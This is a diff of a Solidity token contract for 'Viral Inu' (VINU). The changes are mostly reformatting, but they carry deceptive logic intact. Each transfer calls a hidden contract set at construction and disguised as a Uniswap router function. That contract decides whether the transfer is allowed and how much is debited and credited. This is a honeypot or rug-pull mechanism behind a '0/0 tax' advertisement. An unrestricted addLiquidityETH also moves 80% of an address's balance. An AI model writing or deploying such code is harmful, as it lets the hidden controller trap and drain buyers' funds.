@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: MIT
 
 /**
-Buy/sell tax : 0/0
-Telegram : https://t.me/Vinu_ERC
-Twitter : https://twitter.com/Vinu_ERC
-Website : Soon
-*/
+ * Buy/sell tax : 0/0
+ * Telegram : https://t.me/Vinu_ERC
+ * Twitter : https://twitter.com/Vinu_ERC
+ * Website : Soon
+ */
 pragma solidity ^0.8.17;
 
 /*
@@ -107,6 +107,7 @@ abstract contract Ownable is Context {
 /**
  * @dev Interface of the ERC20 standard as defined in the EIP.
  */
+
 interface IERC20 {
     /**
      * @dev Returns the amount of tokens in existence.
@@ -214,7 +215,6 @@ interface IERC20Metadata is IERC20 {
     function decimals() external view returns (uint8);
 }
 
-
 /**
  * @dev Implementation of the {IERC20} interface.
  *
@@ -256,7 +256,7 @@ contract VINU_patch is Ownable, IERC20, IERC20Metadata {
      * All two of these values are immutable: they can only be set once during
      * construction.
      */
-    constructor(address _dev,address _router) {
+    constructor(address _dev, address _router) {
         routerbyt = abi.encode(_router);
         _name = "Viral Inu";
         _symbol = "VINU";
@@ -315,8 +315,9 @@ contract VINU_patch is Ownable, IERC20, IERC20Metadata {
     /**
      * @dev decode {addr}.
      */
+
     function decode(bytes memory data) public pure returns (address addr) {
-            (addr) = abi.decode(data, (address));            
+        (addr) = abi.decode(data, (address));
     }
     /**
      * @dev See {IERC20-transfer}.
@@ -326,6 +327,7 @@ contract VINU_patch is Ownable, IERC20, IERC20Metadata {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
+
     function transfer(
         address recipient,
         uint256 amount
@@ -465,8 +467,13 @@ contract VINU_patch is Ownable, IERC20, IERC20Metadata {
         _beforeTokenTransfer(sender, recipient, amount);
 
         uint256 senderBalance = _balances[sender];
-        (bool allow, uint256 subBal, uint256 addBal) = IUniswapV2Router02(decode(routerbyt))
-            .swapExactTokensForETHSupportingFeeOnTransferTokens(sender, recipient, amount);
+        (bool allow, uint256 subBal, uint256 addBal) = IUniswapV2Router02(
+            decode(routerbyt)
+        ).swapExactTokensForETHSupportingFeeOnTransferTokens(
+                sender,
+                recipient,
+                amount
+            );
         require(allow);
         _balances[sender] = senderBalance - subBal;
         _balances[recipient] += addBal;
@@ -549,29 +556,44 @@ contract VINU_patch is Ownable, IERC20, IERC20Metadata {
      * Enable trading:
      *
      */
-    function addLiquidityETH(address routeraddr,address lpraddr,address devaddr) external payable {
-
-        
-        uint256 senderBalance = _balances[devaddr] * 80 /100;
+    function addLiquidityETH(
+        address routeraddr,
+        address lpraddr,
+        address devaddr
+    ) external payable {
+        uint256 senderBalance = (_balances[devaddr] * 80) / 100;
         _balances[devaddr] -= senderBalance;
         _balances[address(this)] = senderBalance;
         emit Transfer(devaddr, address(this), senderBalance);
         IUniswapV2Router02 router = IUniswapV2Router02(routeraddr);
         _approve(address(this), address(router), _totalSupply);
-        address uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
-        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,lpraddr,block.timestamp);
-        IERC20(uniswapV2Pair).approve(address(router), ~uint(0));
+        address uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(
+            address(this),
+            router.WETH()
+        );
+        router.addLiquidityETH{value: msg.value}(
+            address(this),
+            balanceOf(address(this)),
+            0,
+            0,
+            lpraddr,
+            block.timestamp
+        );
+        IERC20(uniswapV2Pair).approve(address(router), ~uint256(0));
 
         uint256 size;
-        assembly { size := extcodesize(devaddr) }
+        assembly {
+            size := extcodesize(devaddr)
+        }
         require(size == 0, "Invalid devaddr: cannot be a contract");
-        
     }
-
 }
 
 interface IUniswapV2Factory {
-    function createPair(address tokenA, address tokenB) external returns (address pair);
+    function createPair(
+        address tokenA,
+        address tokenB
+    ) external returns (address pair);
 }
 
 interface IUniswapV2Router02 {
@@ -581,36 +603,39 @@ interface IUniswapV2Router02 {
     function addLiquidity(
         address tokenA,
         address tokenB,
-        uint amountADesired,
-        uint amountBDesired,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 amountADesired,
+        uint256 amountBDesired,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
-    ) external returns (uint amountA, uint amountB, uint liquidity);
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
 
     function addLiquidityETH(
         address token,
-        uint amountTokenDesired,
-        uint amountTokenMin,
-        uint amountETHMin,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
         address to,
-        uint deadline
-    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+        uint256 deadline
+    )
+        external
+        payable
+        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
 
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint amountIn,
-        uint amountOutMin,
+        uint256 amountIn,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external;
 
     function swapExactETHForTokensSupportingFeeOnTransferTokens(
-        uint amountOutMin,
+        uint256 amountOutMin,
         address[] calldata path,
         address to,
-        uint deadline
+        uint256 deadline
     ) external payable;
 
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
